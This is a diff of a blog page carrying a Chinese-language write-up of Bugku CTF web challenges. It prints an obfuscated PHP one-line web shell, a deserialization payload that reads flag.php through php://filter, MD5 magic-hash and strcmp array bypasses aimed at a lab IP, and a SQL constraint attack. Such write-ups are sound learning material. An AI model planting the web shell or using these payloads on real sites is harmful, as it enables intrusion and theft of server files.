@@ -48,7 +48,7 @@
   <script>hljs.initHighlightingOnLoad();</script>
   
 
-  <link rel="shortcut icon" href="https://blank233.github.io/img/clover.png" type="image/x-icon" />
+  <link rel="shortcut icon" href="https://blank233.github.io//img/clover.png" type="image/x-icon" />
 
   
   
@@ -238,7 +238,7 @@
   <div>
     <i class="fa fa-folder fa-fw"></i>
     
-      <a class="post-taxonomy-topic" href="https://blank233.github.iotopics/write_up">Write_up</a>
+      <a class="post-taxonomy-topic" href="https://blank233.github.io/topics/write_up">Write_up</a>
     
   </div>
   
@@ -250,7 +250,7 @@
   <div>
     <i class="fa fa-tags fa-fw"></i>
     
-      <a class="post-taxonomy-tag" href="https://blank233.github.iotags/2018-03">2018-03</a>
+      <a class="post-taxonomy-tag" href="https://blank233.github.io/tags/2018-03">2018-03</a>
     
   </div>
   
@@ -707,9 +707,11 @@ else
 ?&gt;
 </code></pre>
 
-<p><strong>id</strong>:id的值 == 0但是又不能为0 id=0a即可绕过
-<strong>a</strong>:$data==&ldquo;bugku is a nice plateform!&rdquo;  可以用令a=php://input  然后postbugku is a nice plateform!即可绕过.
-<strong>b</strong>:eregi函数遇到%00就会截断 所以令b=%00444444即可绕过</p>
+<p><strong>id</strong>:id的值 == 0但是又不能为0 id=0a即可绕过</p>
+
+<p><strong>a</strong>:$data==&ldquo;bugku is a nice plateform!&rdquo;  可以用令a=php://input  然后postbugku is a nice plateform!即可绕过.</p>
+
+<p><strong>b</strong>:eregi函数遇到%00就会截断 所以令b=%00444444即可绕过</p>
 
 <p>最终payload如下</p>
 
@@ -733,6 +735,353 @@ else
 
 </div>
 
+
+<ul>
+<li>welcome to bugkuctf</li>
+</ul>
+
+<p>打开链接 查看源代码  得到注释的一些代码  如下</p>
+
+<pre><code>$user = $_GET[&quot;txt&quot;];  
+$file = $_GET[&quot;file&quot;];  
+$pass = $_GET[&quot;password&quot;];  
+  
+if(isset($user)&amp;&amp;(file_get_contents($user,'r')===&quot;welcome to the bugkuctf&quot;)){  
+    echo &quot;hello admin!&lt;br&gt;&quot;;  
+    include($file); //hint.php  
+}else{  
+    echo &quot;you are not admin ! &quot;;  
+}  
+</code></pre>
+
+<p>GET方式传递三个参数txt，file和password</p>
+
+<p>首先  跟上一题一样  我们可以使用php://input的方式绕过file_get_contents()</p>
+
+<p>构造测试</p>
+
+
+
+<div class="pure-g">
+
+  
+  
+  
+  
+  <div class="pure-u-1-1">
+    <div style="padding: 0 .2em">
+      <img
+        class="pure-img-responsive"
+        src="https://blank233.github.io/post/img/Bugku_ctf_wp_1/2.png"
+        alt=" Img of Hugo website">
+    </div>
+  </div>
+  
+
+</div>
+
+
+<p>然后可以看到下面有一个include函数 文件包含 同样使用php的文件流得到hint.php base64后的源码</p>
+
+<p>测试如图</p>
+
+
+
+<div class="pure-g">
+
+  
+  
+  
+  
+  <div class="pure-u-1-1">
+    <div style="padding: 0 .2em">
+      <img
+        class="pure-img-responsive"
+        src="https://blank233.github.io/post/img/Bugku_ctf_wp_1/3.png"
+        alt=" Img of Hugo website">
+    </div>
+  </div>
+  
+
+</div>
+
+
+<p>解码后代码如下</p>
+
+<pre><code>&lt;?php  
+  
+class Flag{//flag.php  
+    public $file;  
+    public function __tostring(){  
+        if(isset($this-&gt;file)){  
+            echo file_get_contents($this-&gt;file); 
+			echo &quot;&lt;br&gt;&quot;;
+		return (&quot;good&quot;);
+        }  
+    }  
+}  
+?&gt;  
+</code></pre>
+
+<p>php反序列化 (不要问我怎么知道的 我也不知道)</p>
+
+<p>O:4:&ldquo;Flag&rdquo;:1:{s:4:&ldquo;file&rdquo;;s:57:&ldquo;php://filter/read=convert.base64-encode/resource=flag.php&rdquo;;}</p>
+
+<p>然后最终payload如下</p>
+
+<p>
+
+<div class="pure-g">
+
+  
+  
+  
+  
+  <div class="pure-u-1-1">
+    <div style="padding: 0 .2em">
+      <img
+        class="pure-img-responsive"
+        src="https://blank233.github.io/post/img/Bugku_ctf_wp_1/4.png"
+        alt=" Img of Hugo website">
+    </div>
+  </div>
+  
+
+</div>
+
+base64解码后得到flag</p>
+
+<pre><code>&lt;?php  
+//flag{php_is_the_best_language}  1
+?&gt;
+</code></pre>
+
+<p><strong>关于php反序列化有时间写一篇博客或笔记</strong></p>
+
+<ul>
+<li>过狗一句话</li>
+</ul>
+
+<p>tip给了一个一句话木马 刚开始没意识到这东西的重要性 = =</p>
+
+<pre><code>&lt;?php $poc=&quot;a#s#s#e#r#t&quot;; $poc_1=explode(&quot;#&quot;,$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET['s']) ?&gt;
+</code></pre>
+
+<p>点开啥都没有 查看源代码 burp suite抓包都试过没用  然后想到最开始那个木马  尝试一下</p>
+
+
+
+<div class="pure-g">
+
+  
+  
+  
+  
+  <div class="pure-u-1-1">
+    <div style="padding: 0 .2em">
+      <img
+        class="pure-img-responsive"
+        src="https://blank233.github.io/post/img/Bugku_ctf_wp_1/5.png"
+        alt=" Img of Hugo website">
+    </div>
+  </div>
+  
+
+</div>
+
+
+<p>真的可以 接着尝试system(&lsquo;ls&rsquo;)查看目录  然而返回空白 可能是没权限</p>
+
+<p>测试查询所有php文件</p>
+
+
+
+<div class="pure-g">
+
+  
+  
+  
+  
+  <div class="pure-u-1-1">
+    <div style="padding: 0 .2em">
+      <img
+        class="pure-img-responsive"
+        src="https://blank233.github.io/post/img/Bugku_ctf_wp_1/6.png"
+        alt=" Img of Hugo website">
+    </div>
+  </div>
+  
+
+</div>
+
+
+<p>查看所有的txt文件</p>
+
+
+
+<div class="pure-g">
+
+  
+  
+  
+  
+  <div class="pure-u-1-1">
+    <div style="padding: 0 .2em">
+      <img
+        class="pure-img-responsive"
+        src="https://blank233.github.io/post/img/Bugku_ctf_wp_1/7.png"
+        alt=" Img of Hugo website">
+    </div>
+  </div>
+  
+
+</div>
+
+
+<p>查看flag.txt文件内容 得到flag</p>
+
+
+
+<div class="pure-g">
+
+  
+  
+  
+  
+  <div class="pure-u-1-1">
+    <div style="padding: 0 .2em">
+      <img
+        class="pure-img-responsive"
+        src="https://blank233.github.io/post/img/Bugku_ctf_wp_1/8.png"
+        alt=" Img of Hugo website">
+    </div>
+  </div>
+  
+
+</div>
+
+
+<ul>
+<li>字符？正则？</li>
+</ul>
+
+<p>正则匹配  慢慢绕</p>
+
+<pre><code> &lt;?php 
+highlight_file('2.php');
+$key='KEY{********************************}';
+$IM= preg_match(&quot;/key.*key.{4,7}key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;, trim($_GET[&quot;id&quot;]), $match);
+# 正则解析
+# / 表示开始 匹配字符串key .*匹配任意字符0次或多次 匹配字符串key .{4,7}匹配任意字符4到7次 匹配key:
+# \/ \表示转义 匹配/ 匹配任意字符 匹配/ 匹配任意字符一次或多次跟key组合起来 匹配一个字母 匹配一个符号 结束 大小写不敏感
+# 例 key1key1234key:/1/1keya;
+if( $IM ){ 
+  die('key is: '.$key);
+}
+?&gt; 
+</code></pre>
+
+<ul>
+<li>前女友(SKCTF)</li>
+</ul>
+
+<p>打开后 真是一个凄美的爱情故事  红红火火红红火火恍恍惚惚</p>
+
+<p>查看源代码  发现链接两个字可以跳转 点击跳转 得到如下代码</p>
+
+<pre><code>&lt;?php
+if(isset($_GET['v1']) &amp;&amp; isset($_GET['v2']) &amp;&amp; isset($_GET['v3'])){
+    $v1 = $_GET['v1'];
+    $v2 = $_GET['v2'];
+    $v3 = $_GET['v3'];
+    if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2)){
+        if(!strcmp($v3, $flag)){
+            echo $flag;
+        }
+    }
+}
+?&gt;
+</code></pre>
+
+<p>v1 v2值不同 md5值相同  可以用上述0e开头的md5字符串绕过</p>
+
+<p>strcmp函数漏洞 v3只要是一个数组就可以绕过</p>
+
+<p>payload <a href="http://118.89.219.210:49162/?v1=s1885207154a&amp;v2=s1836677006a&amp;v3[]=1">http://118.89.219.210:49162/?v1=s1885207154a&amp;v2=s1836677006a&amp;v3[]=1</a></p>
+
+<ul>
+<li>login1(SKCTF)</li>
+</ul>
+
+<p>sql约束攻击</p>
+
+<pre><code>注册界面用户名设为admin                                 1
+密码只要符合要求就行
+然后就可以使用自己设置的密码登陆admin账户了 登陆即可拿到flag
+</code></pre>
+
+<p>不懂SQL约束攻击可以点击<a href="http://www.freebuf.com/articles/web/124537.html">这里！</a></p>
+
+<p>看完就懂了</p>
+
+<ul>
+<li>你从哪里来</li>
+</ul>
+
+<p>抓包  更改refer为谷歌网址就行了</p>
+
+<ul>
+<li>md5 collision(NUPT_CTF)</li>
+</ul>
+
+<p>我只能说这题很不友好  毫无提示  让我蒙出来了</p>
+
+<p>本以为是md5(NUPT_CTF)  结果好像还是0e开头的字符串md5值比较</p>
+
+<ul>
+<li>各种绕过呦</li>
+</ul>
+
+<p>shal漏洞 百度一下就有</p>
+
+<p>payload 如下</p>
+
+
+
+<div class="pure-g">
+
+  
+  
+  
+  
+  <div class="pure-u-1-1">
+    <div style="padding: 0 .2em">
+      <img
+        class="pure-img-responsive"
+        src="https://blank233.github.io/post/img/Bugku_ctf_wp_1/9.png"
+        alt=" Img of Hugo website">
+    </div>
+  </div>
+  
+
+</div>
+
+
+<ul>
+<li>web8</li>
+</ul>
+
+<p>还是file_get_contents 使用php://input绕过得到flag</p>
+
+<ul>
+<li>细心</li>
+</ul>
+
+<p>点进去一看就是个假的404 查看下robots.txt  发现一个resusl.php</p>
+
+<p>访问后最下方有一行代码</p>
+
+<p>各种尝试无果后想到了tip的admin  使x=admin即可</p>
 
 <hr />
 
@@ -771,7 +1120,7 @@ else
 
 </div>
 </div>
-<script src="https://blank233.github.iojs/ui.js"></script>
+<script src="https://blank233.github.io/js/ui.js"></script>
 
 
 <script>
